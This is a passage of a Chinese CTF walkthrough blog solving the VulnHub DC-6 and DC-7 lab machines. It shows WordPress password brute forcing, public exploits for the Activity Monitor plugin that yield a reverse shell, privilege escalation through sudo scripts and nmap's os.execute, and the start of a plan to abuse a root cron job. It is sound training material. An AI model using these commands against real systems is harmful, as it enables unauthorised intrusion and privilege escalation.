<p>然后就得到一个密码【擦，难道和<code>dc2</code>一样的】</p>
<p>然后我们开始进行爆破登录【注意需要<code>root</code>权限】</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">wpscan <span class="attr">--url</span> wordy <span class="attr">--usernames</span> user<span class="selector-class">.txt</span> <span class="attr">--passwords</span> pass<span class="selector-class">.txt</span>                             </span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221009231928764.png"><img src="/vulnhub/image-20221009231928764.png" alt="image-20221009231928764"></a></p>
<p>结果肯定是不行的【肯定不和<code>DC2</code>一样】</p>
<p>&#x3D;&#x3D;&gt;</p>
<p>所以这里我们需要找一个<strong>完整的密码字典</strong></p>
<blockquote>
<p>需要用到<code>wordpress</code>的密码字典，kali自带<code>rockyou.txt</code></p>
</blockquote>
<p>由作者提示得【也就是把密码一部分告诉你了】</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221113171203270.png"><img src="/vulnhub/image-20221113171203270.png" alt="image-20221113171203270"></a></p>
<blockquote>
<p><code>wpscan --url http://wordy --usernames user.txt --passwords /usr/share/wordlists/rockyou.txt|grep k01 -t 5</code></p>
<p>&#x2F;&#x2F;-t是添加线程数，默认是5，多加几个可以更快一些</p>
</blockquote>
<p>如果直接跑的有点久了</p>
<p><code>。。。。。。。【睡了一晚上，不知道好久跑出来的】</code></p>
<p><code>【七千万密码】</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221010225451565.png"><img src="/vulnhub/image-20221010225451565.png" alt="image-20221010225451565"></a></p>
<p>最后得到</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221010230354224.png"><img src="/vulnhub/image-20221010230354224.png" alt="image-20221010230354224"></a></p>
<blockquote>
<p>username:<code>mark</code><br>password:<code>helpdesk01</code></p>
</blockquote>
<p>虽然只有一个用户但是够了</p>
<hr>
<h2 id="3-登录网站找信息"><a href="#3-登录网站找信息" class="headerlink" title="3.登录网站找信息"></a>3.登录网站找信息</h2><p>登录后发现是一个<code>wordpress</code>的后台网站</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221010231254865.png"><img src="/vulnhub/image-20221010231254865.png" alt="image-20221010231254865"></a></p>
<p>在左侧我们发现了一个新的东西叫做</p>
<p><code>Activity monitor</code></p>
<blockquote>
<p>是一款网站用户活动监控插件，我们用户登录的ip和其他信息都会被监控</p>
<p>&#x2F;&#x2F;那么我们是不是可以试试找找这个插件有没有漏洞，从而通过这个漏洞拿到shell或者其他更高权限用户的信息</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221010231223449.png"><img src="/vulnhub/image-20221010231223449.png" alt="image-20221010231223449"></a></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221010231622962.png"><img src="/vulnhub/image-20221010231622962.png" alt="image-20221010231622962"></a></p>
<p>我们查一下</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">searchsploit activity <span class="literal">monitor</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221010231725009.png"><img src="/vulnhub/image-20221010231725009.png" alt="image-20221010231725009"></a></p>
<p>发现果然是有的，只是不知道能不能利用</p>
<p>我们主要找后面两个和<code>wordpress</code>相关的</p>
<blockquote>
<p><code>45274.html</code>是命令注入<br><code>50110.py</code>是远程命令执行</p>
</blockquote>
<h3 id="1）50110-py【有问题，不建议用】"><a href="#1）50110-py【有问题，不建议用】" class="headerlink" title="1）50110.py【有问题，不建议用】"></a>1）50110.py【有问题，不建议用】</h3><p>感觉<code>py</code>更方便一些，我们先查看内容</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cat <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/php/</span>webapps/<span class="number">50110</span>.py</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221010232311464.png"><img src="/vulnhub/image-20221010232311464.png" alt="image-20221010232311464"></a></p>
<p>看来只需要<code>ip</code>，以及<code>用户名</code>和<code>密码</code>即可进入<code>shell</code></p>
<p>我们运行一下</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">python <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/php/</span>webapps/<span class="number">50110</span>.py</span><br></pre></td></tr></table></figure>



<p>然后我按我的输入</p>
<blockquote>
<p><code>192.168.133.145</code><br><code>mark</code><br><code>helpdesk01</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221010232611030.png"><img src="/vulnhub/image-20221010232611030.png" alt="image-20221010232611030"></a></p>
<p>进入<code>shell</code></p>
<hr>
<p>然后固定姿势，进入交互式<code>shell</code></p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>

<p>但是会报错</p>
<p>似乎不能使用<code>python</code>命令，一使用就退出<code>shell</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221010233037169.png"><img src="/vulnhub/image-20221010233037169.png" alt="image-20221010233037169"></a></p>
<p>那就看起来有点难受了，再试试能不能进入稳定<code>shell</code></p>
<blockquote>
<p>先<br><code>ctrl+z</code><br>然后执行<br><code>stty raw -echo ; fg ; reset</code>  </p>
</blockquote>
<p>结果卡死了</p>
<p>算了算了，就这样看吧</p>
<p>【我这里把<code>py</code>脚本导入一个新的文件里（<code>1.py</code>），把我的ip，用户名，密码都写了进去，就不用退出了又重新输入了】</p>
<hr>
<p>先退到主目录看看有几个用户</p>
<p>但是发现好像有点问题，似乎有的命令执行就和脚本冲突，那就用</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221010234544191.png"><img src="/vulnhub/image-20221010234544191.png" alt="image-20221010234544191"></a></p>
<h3 id="2）45274-html"><a href="#2）45274-html" class="headerlink" title="2）45274.html"></a>2）45274.html</h3><p>那我们先不管它，我们还有一个命令注入的没有用，</p>
<p>我们先查看一下内容</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cat <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/php/</span>webapps/<span class="number">45274</span>.html</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221011113959660.png"><img src="/vulnhub/image-20221011113959660.png" alt="image-20221011113959660"></a></p>
<p>我们把这个文件导入一个新文件中【1.html】</p>
<p>主要是修改这里的网站网址和监听本地<code>ip</code>，改成我们的<code>wordy</code>和<code>kali</code>机的<code>ip</code></p>
<figure class="highlight nsis"><table><tr><td class="code"><pre><span class="line">http://localhost:<span class="number">8000</span>/wp-<span class="literal">admin</span>/<span class="literal">admin</span>.php?<span class="keyword">page</span>=plainview_activity_monitor&amp;tab=activity_tools</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line">http://wordy/wp-<span class="literal">admin</span>/<span class="literal">admin</span>.php?<span class="keyword">page</span>=plainview_activity_monitor&amp;tab=activity_tools</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221011115438911.png"><img src="/vulnhub/image-20221011115438911.png" alt="image-20221011115438911"></a></p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">nc -nlvp <span class="number">127.0</span>.<span class="number">0.1</span>   <span class="operator">=</span><span class="operator">=</span>&gt;   nc <span class="number">192.168</span>.<span class="number">133.140</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221011114105820.png"><img src="/vulnhub/image-20221011114105820.png" alt="image-20221011114105820"></a></p>
<p>然后因为是<code>html</code>文件，我们可以直接用浏览器打开，</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221011114637014.png"><img src="/vulnhub/image-20221011114637014.png" alt="image-20221011114637014"></a></p>
<p>当然也可以</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python</span> -m http.server <span class="number">8008</span></span><br></pre></td></tr></table></figure>

<p>然后以浏览器方式访问本地<code>ip:8008</code>，再打开里面<code>1.html</code>文件</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221011114825111.png"><img src="/vulnhub/image-20221011114825111.png" alt="image-20221011114825111"></a></p>
<h4 id="nc监听拿shell"><a href="#nc监听拿shell" class="headerlink" title="nc监听拿shell"></a>nc监听拿shell</h4><p>然后我们发现有个</p>
<p><code>Submit request</code>的按钮，看来是发送请求，然后<code>nc</code>反弹shell</p>
<blockquote>
<p>注意监听端口是<code>9999</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221011115108761.png"><img src="/vulnhub/image-20221011115108761.png" alt="image-20221011115108761"></a></p>
<p>然后我们在浏览器点击一下<code>Submit request</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221011122029894.png"><img src="/vulnhub/image-20221011122029894.png" alt="image-20221011122029894"></a></p>
<p>连接到 <code>shell</code></p>
<p>这个比脚本的那个就更加方便一下了，</p>
<hr>
<p>固定姿势</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>

<p>然后进入稳定式shell</p>
<blockquote>
<p>先<code>ctrl+z</code><br>然后执行<br><code>stty raw -echo ; fg ; reset</code>  </p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221011122301709.png"><img src="/vulnhub/image-20221011122301709.png" alt="image-20221011122301709"></a></p>
<hr>
<p>然后开始找找有没有其他用户的密码信息</p>
<p>先到 <code>/home</code> 里查看一下，发现了除了<code>admin</code>其他三个用户目录</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221011122438174.png"><img src="/vulnhub/image-20221011122438174.png" alt="image-20221011122438174"></a></p>
<p>我们先进我们登录成功的<code>mark</code>目录查看</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221011122638708.png"><img src="/vulnhub/image-20221011122638708.png" alt="image-20221011122638708"></a></p>
<p>发现有个<code>things-to-do.txt</code>文本文件</p>
<p>查看内容</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cat</span> things-<span class="keyword">to</span>-<span class="keyword">do</span>.txt</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221011122741660.png"><img src="/vulnhub/image-20221011122741660.png" alt="image-20221011122741660"></a></p>
<blockquote>
<p><code>Things to do:</code></p>
<ul>
<li><code>Restore full functionality for the hyperdrive (need to speak to Jens)</code></li>
<li><code>Buy present for Sarah&#39;s farewell party</code></li>
<li><code>Add new user: graham - GSo7isUM1D4 - done</code></li>
<li><code>Apply for the OSCP course</code></li>
<li><code>Buy new laptop for Sarah&#39;s replacement</code></li>
</ul>
<p>意思是：</p>
<p>要做的事情：</p>
<ul>
<li>恢复超光速引擎的全部功能（需要与 Jens 交谈）</li>
<li>为莎拉的告别派对购买礼物</li>
<li>添加新用户：graham - GSo7isUM1D4 - 完成</li>
<li>申请OSCP课程</li>
<li>为莎拉购买新的笔记本电脑</li>
</ul>
<p>&#x2F;&#x2F;关键信息我们得到了graham用户的密码【我也想考OSCP，哭唧唧】</p>
</blockquote>
<p>我们根据我们拿到<code>graham</code>的信息，登录<code>ssh</code></p>
<p>【当然在原有<code>shell</code>里利用<code>su</code>命令切换用户<code>graham</code>也是可以的，但是<code>ssh</code>有颜色，看起来好看一些】</p>
<p>【因为之前就看到运行着<code>ssh</code>，没必要再在登录一次网站，反正不是最高权限】</p>
<blockquote>
<p><code>ssh graham@192.168.133.145 -p 22</code>    &#x2F;&#x2F;靶机ip  ssh运行端口<br>密码：<code>GSo7isUM1D4</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221011123625279.png"><img src="/vulnhub/image-20221011123625279.png" alt="image-20221011123625279"></a></p>
<p>然后我们看看我们有哪些命令可以执行</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221011124153885.png"><img src="/vulnhub/image-20221011124153885.png" alt="image-20221011124153885"></a></p>
<p>看到是有<code>jens</code>目录下一个脚本文件的运行权限，而且不需要<code>jens</code>的密码，就可以他的身份下运行了【<code>mark</code>我试了的，没有权限】</p>
<h4 id="以其他用户身份运行脚本，实现切换用户"><a href="#以其他用户身份运行脚本，实现切换用户" class="headerlink" title="以其他用户身份运行脚本，实现切换用户"></a>以其他用户身份运行脚本，实现切换用户</h4><p>我们先查看一下内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /home/jens/backups.sh</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221011124824445.png"><img src="/vulnhub/image-20221011124824445.png" alt="image-20221011124824445"></a></p>
<p>发现是执行一些命令，</p>
<p>但是我们的目的想获得<code>jens</code>的登录权限，我们在脚本文件中追加一些命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/bin/bash&quot;</span>  &gt;&gt; /home/jens/backups.sh</span><br></pre></td></tr></table></figure>

<p>这样的话当我们以<code>jens</code>身份运行这个脚本时，当执行<code>/bin/bash</code>时，就算我们现在是<code>graham</code>，也会切换成<code>jens</code>，这也得益于可以<code>nopasswd</code>运行</p>
<blockquote>
<p><code>sudo -u jens /home/jens/backups.sh</code></p>
<p>&#x2F;&#x2F;注意哦，这里是需要以<code>jens</code>身份运行【毕竟他给了我们用他身份执行权限】才可以实现切换用户，如果直接运行还是<code>graham</code>用户，就如下图一样</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221011125910796.png"><img src="/vulnhub/image-20221011125910796.png" alt="image-20221011125910796"></a></p>
<p>切换用户成功，</p>
<p>我们先看看<code>jens</code>有哪些命令可以执行</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221011130314044.png"><img src="/vulnhub/image-20221011130314044.png" alt="image-20221011130314044"></a></p>
<p>终于，发现了<code>root</code>的，我们可以执行<code>nmap</code>命令【只有管理员可以】，那么如何拿到权限呢</p>
<h2 id="4-nmap提权"><a href="#4-nmap提权" class="headerlink" title="4.nmap提权"></a>4.nmap提权</h2><h3 id="1-旧版"><a href="#1-旧版" class="headerlink" title="1.旧版"></a>1.旧版</h3><p>nmap（2.02-5.21）存在交换模式，可利用提权</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">nmap <span class="comment">--interactive</span></span><br></pre></td></tr></table></figure>

<p>之后执行:</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span>&gt; !sh</span><br><span class="line"><span class="attribute">sh</span>-<span class="number">3</span>.<span class="number">2</span># whoami</span><br><span class="line"><span class="attribute">root</span></span><br></pre></td></tr></table></figure>

<p>msf中的模块为：</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">exploit/unix/<span class="keyword">local</span>/setuid_nmap</span><br></pre></td></tr></table></figure>

<h3 id="2-新版"><a href="#2-新版" class="headerlink" title="2.新版"></a>2.新版</h3><p>较新版可使用 <code>--script</code> 参数：</p>
<blockquote>
<p>先写入一条命令<br><code>echo &quot;os.execute(&#39;/bin/sh&#39;)&quot; &gt; getshell</code><br>再–script参数，执行<br><code>sudo nmap --script=getshell</code></p>
</blockquote>
<p>查看一下靶机的<code>nmap</code>版本</p>
<p><code>7.4</code>还是挺高的</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221011131514173.png"><img src="/vulnhub/image-20221011131514173.png" alt="image-20221011131514173"></a></p>
<p>那我们写一个脚本，里面加上命令，再用新版<code>nmap</code>运行这个脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;os.execute(&#x27;/bin/sh&#x27;)&quot;</span> &gt; getshell</span><br></pre></td></tr></table></figure>



<blockquote>
<p>注意哈，<code>jens</code>只有在<code>~</code>目录下才可以执行<code>echo</code>命令，不然是不可以的</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221011132114963.png"><img src="/vulnhub/image-20221011132114963.png" alt="image-20221011132114963"></a></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">sudo nmap <span class="attribute">--script</span>=getshell</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221011132315607.png"><img src="/vulnhub/image-20221011132315607.png" alt="image-20221011132315607"></a></p>
<p>成功提权，然后我们查找<code>flag</code>【没输入回显有点小难受，但是不影响拿<code>flag</code>】</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221011132507052.png"><img src="/vulnhub/image-20221011132507052.png" alt="image-20221011132507052"></a></p>
<blockquote>
<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">Yb        dP<span class="number"> 888888 </span>88    <span class="number"> 88 </span>        8888b.   dP&quot;Yb  88b<span class="number"> 88 </span>888888 d8b </span><br><span class="line"> Yb  db  dP  88__  <span class="number"> 88 </span>   <span class="number"> 88 </span>         8I  Yb dP   Yb 88Yb88 88__   Y8P </span><br><span class="line">  YbdPYbdP   88&quot;&quot;  <span class="number"> 88 </span> .o<span class="number"> 88 </span> .o      8I  dY Yb   dP<span class="number"> 88 </span>Y88 88&quot;&quot;   `&quot;&#x27; </span><br><span class="line">   YP  YP   <span class="number"> 888888 </span>88ood8 88ood8     8888Y&quot;   YbodP <span class="number"> 88 </span> Y8<span class="number"> 888888 </span>(8) </span><br></pre></td></tr></table></figure>

<p><code>Congratulations!!!</code></p>
<p><code>Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those</code><br><code>who have provided feedback, and who have taken time to complete these little</code><br><code>challenges.</code></p>
<p><code>If you enjoyed this CTF, send me a tweet via @DCAU7.</code></p>
<p>意思是：<br>恭喜！！！</p>
<p>希望你喜欢 DC-6。只是想向所有这些人表示衷心的感谢<br>谁提供了反馈，谁花时间完成了这些小事<br>挑战。</p>
<p>如果你喜欢这个 CTF，请通过@DCAU7 给我发一条推文。</p>
</blockquote>
<p><strong>一个旗子找完，游戏结束</strong></p>
<hr>
<h1 id="七、DC-7-中级"><a href="#七、DC-7-中级" class="headerlink" title="七、DC-7[中级]"></a>七、DC-7[中级]</h1><p><strong>only one flag</strong></p>
<blockquote>
<p><code>hint：</code><br><code>While it&#39;s kind of a logical progression from an earlier DC release (I won&#39;t tell you which one), there are some new concepts involved, but you will need to figure those out for yourself. :-) If you need to resort to brute forcing or dictionary attacks, you probably won&#39;t succeed.</code></p>
<p><code>What you will need to do, is to think &quot;outside&quot; of the box.</code></p>
<p><code>Waaaaaay &quot;outside&quot; of the box. :-)</code></p>
<p>虽然这是较早的 DC 版本的一种合乎逻辑的进展（我不会告诉你是哪一个），但其中涉及到一些新概念，但你需要自己弄清楚这些。:-) 如果您需要使用暴力破解或字典攻击，您可能不会成功。</p>
<p>您需要做的是跳出框框思考。</p>
<p>Waaaaaay“在盒子外面”。:-)</p>
</blockquote>
<h2 id="信息收集-6"><a href="#信息收集-6" class="headerlink" title="信息收集"></a>信息收集</h2><p><code>nmap</code>扫描查看开放端口</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018195918528.png"><img src="/vulnhub/image-20221018195918528.png" alt="image-20221018195918528"></a></p>
<p>发现运行着<code>22</code>和<code>80</code>端口，<code>22</code>端口运行着<code>ssh</code></p>
<p>先看看框架和语言</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018194429569.png"><img src="/vulnhub/image-20221018194429569.png" alt="image-20221018194429569"></a></p>
<p><code>CMS</code>是<code>Drupal 8</code>，看来这是关键【好家伙，<code>DC1</code>重现】</p>
<p>再顺手扫一下</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018194353195.png"><img src="/vulnhub/image-20221018194353195.png" alt="image-20221018194353195"></a></p>
<p>看到有一个登录窗口页面</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018194531613.png"><img src="/vulnhub/image-20221018194531613.png" alt="image-20221018194531613"></a></p>
<p>那我们就先想办法怎么获得一个用户的账号密码</p>
<hr>
<h2 id="1-跳出框架"><a href="#1-跳出框架" class="headerlink" title="1.跳出框架"></a>1.跳出框架</h2><blockquote>
<p>这里我开始以为是思维的框架，结果是靶机的框架，我们需要用搜素工具，得到我们的信息，而不是死脑筋在靶机上苦苦找漏洞或者蛮用爆破</p>
<p>在实际的环境中，我们也是这样的，在网站之外获得网站的信息，这也是收集信息的一个重要的办法</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018200526154.png"><img src="/vulnhub/image-20221018200526154.png" alt="image-20221018200526154"></a></p>
<p>在网站的最底下我们发现了</p>
<figure class="highlight aspectj"><table><tr><td class="code"><pre><span class="line"><span class="meta">@DC</span>7USER</span><br></pre></td></tr></table></figure>

<p>这应该是网站的搭建者，对于像这种小网站，一般可能是在一些平台，比如<code>github</code>上搭建、挂载的【比如我的博客】，所以在这些平台上，我们很有可能得到一些我们想要的敏感信息和文件</p>
<p>所以我们用<code>bing</code>查一下【国内搜索引擎很难搜到，谷歌要魔法，我写这<code>DC7</code>这几天不方便魔法，所以<code>bing</code>最好】</p>
<p>还真找到了</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/Dc7User/</span>staffdb<span class="regexp">/blob/m</span>aster/config.php</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018201258802.png"><img src="/vulnhub/image-20221018201258802.png" alt="image-20221018201258802"></a></p>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">|<span class="string"> &lt;?php </span>|<span class="string">                                                              </span>|</span><br><span class="line">|<span class="string"> ----- </span>|<span class="string"> ------------------------------------------------------------ </span>|</span><br><span class="line">|<span class="string">       </span>|<span class="string"> $servername = &quot;localhost&quot;;                                   </span>|</span><br><span class="line">|<span class="string">       </span>|<span class="string"> $username = &quot;dc7user&quot;;                                       </span>|</span><br><span class="line">|<span class="string">       </span>|<span class="string"> $password = &quot;MdR3xOgB7#dW&quot;;                                  </span>|</span><br><span class="line">|<span class="string">       </span>|<span class="string"> $dbname = &quot;Staff&quot;;                                           </span>|</span><br><span class="line">|<span class="string">       </span>|<span class="string"> $conn = mysqli_connect($servername, $username, $password, $dbname); </span>|</span><br><span class="line">|<span class="string">       </span>|<span class="string"> ?&gt;                                                           </span>|</span><br></pre></td></tr></table></figure>

<p>得到账号和密码，以及数据库的名字，看来我们确实跳出了框架</p>
<p>我们利用账号密码在我们之前的网站登录一下试试</p>
<blockquote>
<p>$username &#x3D; “<code>dc7user</code>“;<br>$password &#x3D; “<code>MdR3xOgB7#dW</code>“;  </p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018201801467.png"><img src="/vulnhub/image-20221018201801467.png" alt="image-20221018201801467"></a></p>
<p>结果报错，看来这个账号并不是在这个页面登录的</p>
<h2 id="2-ssh登录"><a href="#2-ssh登录" class="headerlink" title="2.ssh登录"></a>2.ssh登录</h2><p>我们根据之前得到的信息知道，<code>22</code>端口运行着<code>ssh</code>，我们用其登录试试</p>
<blockquote>
<p>$username &#x3D; “<code>dc7user</code>“;<br>$password &#x3D; “<code>MdR3xOgB7#dW</code>“;  </p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018202130724.png"><img src="/vulnhub/image-20221018202130724.png" alt="image-20221018202130724"></a></p>
<p>好家伙，果然是<code>ssh</code>的账号密码</p>
<p>我们来找找有没有什么有用的东西</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018202308173.png"><img src="/vulnhub/image-20221018202308173.png" alt="image-20221018202308173"></a></p>
<p>我们先打开<code>backups</code>文件夹</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018202658047.png"><img src="/vulnhub/image-20221018202658047.png" alt="image-20221018202658047"></a></p>
<p>发现是两个<code>.gpg</code>文件</p>
<blockquote>
<p><code>gpg</code>文件<br>就是一个加密文件</p>
</blockquote>
<p>而我们现在没有信息和密码，所以我们再看看另一个文件</p>
<blockquote>
<p>返回上级目录<br><code>cat mbox</code> </p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018203146128.png"><img src="/vulnhub/image-20221018203146128.png" alt="image-20221018203146128"></a></p>
<p>发现是<code>root</code>用户命令执行的记录</p>
<p>发现了</p>
<blockquote>
<p><code>Database dump saved to /home/dc7user/backups/website.sql</code><br>&#x2F;&#x2F;数据库信息存入website.sql文件<br>&#x2F;&#x2F;然后root执行了加密脚本加密数据库文件</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018203403493.png"><img src="/vulnhub/image-20221018203403493.png" alt="image-20221018203403493"></a></p>
<h3 id="定时任务【cron（crond）】"><a href="#定时任务【cron（crond）】" class="headerlink" title="*定时任务【cron（crond）】"></a>*定时任务【cron（crond）】</h3><p>我们发现在<code>root</code>用户执行加密脚本之前有一个<code>Cron</code></p>
<blockquote>
<p><code>Cron</code>发现是定时任务，代表过一段时间就执行一次，以来更新数据库备份文件【<code>backups</code>】</p>
<p>这是个定时任务 用<code>root</code> 运行<code>/opt/scripts/backups.sh</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018203434313.png"><img src="/vulnhub/image-20221018203434313.png" alt="image-20221018203434313"></a></p>
<h3 id="关键思路"><a href="#关键思路" class="headerlink" title="*关键思路"></a>*关键思路</h3><p>查看下权限什么的，发现<code>www-data</code>拥有执行和写的权限，我们当前权限没有写权限，看来没办法动手脚了。</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018234503615.png"><img src="/vulnhub/image-20221018234503615.png" alt="image-20221018234503615"></a></p>
<h3 id><a href="#" class="headerlink" title></a></h3><p>但是如果我们获得了<code>www-data</code>的<code>shell</code> 那就可以写点东西进去，然后依靠<strong>计划任务</strong>，用<code>root</code>去运行，然后反弹<code>shell</code>，那么我们可以获得了<code>root</code>权限的<code>shell</code>了。</p>
<h2 id="3-drush命令对drupal修改用户名和密码"><a href="#3-drush命令对drupal修改用户名和密码" class="headerlink" title="3.drush命令对drupal修改用户名和密码"></a>3.<code>drush</code>命令对<code>drupal</code>修改用户名和密码</h2><p>我们按路径查看该脚本内容</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018203742731.png"><img src="/vulnhub/image-20221018203742731.png" alt="image-20221018203742731"></a></p>
<p>我们发现果然是个加密数据库文件的脚本，但是我们仍然不知道密码</p>
<p>但是我们发现了数据库文件似乎被更改过</p>
<p>出现了一个新的命令</p>
<blockquote>
<p><code>drush</code><br>&#x2F;&#x2F;drush命令是在drupal框架中进行配置的命令，可以修改用户名和密码，<br>&#x2F;&#x2F;但是drush必须在drupal安装目录下进行，所以我们可以按脚本给的<br><code>cd /var/www/html/</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018204531647.png"><img src="/vulnhub/image-20221018204531647.png" alt="image-20221018204531647"></a></p>
<blockquote>
<p><code>cd /var/www/html</code><br><code>drush user-password admin:123456</code><br>&#x2F;&#x2F;用户名<code>admin</code>和密码<code>123456</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018205540723.png"><img src="/vulnhub/image-20221018205540723.png" alt="image-20221018205540723"></a></p>
<p>然后成功修改用户<code>admin</code>的密码为<code>123456</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018212431462.png"><img src="/vulnhub/image-20221018212431462.png" alt="image-20221018212431462"></a></p>
<h2 id="4-登录网站"><a href="#4-登录网站" class="headerlink" title="4.登录网站"></a>4.登录网站</h2><p>当我们输入我们修改后的密码后，成功登录<code>admin</code>用户</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018212905392.png"><img src="/vulnhub/image-20221018212905392.png" alt="image-20221018212905392"></a></p>
<p>然后我们统合一下思路，我们进入了网站后，应该如何拿到<code>shell</code>，那肯定需要写木马或者反弹<code>shell</code></p>
<p>那么我们就需要找到可以修改并增加<code>php</code>文件的的地方</p>
<p>我们先打开<code>content</code>页面，发现有<code>开始.html</code>页面</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018212952593.png"><img src="/vulnhub/image-20221018212952593.png" alt="image-20221018212952593"></a></p>
<p>点开查看</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018215114742.png"><img src="/vulnhub/image-20221018215114742.png" alt="image-20221018215114742"></a></p>
<p>发现可以修改内容，看来我们可以试试修改它，变成我们的木马文件</p>
<p>结果发现文件只能以<code>html</code>形式执行，而不能以<code>php</code>形式执行</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018215830844.png"><img src="/vulnhub/image-20221018215830844.png" alt="image-20221018215830844"></a></p>
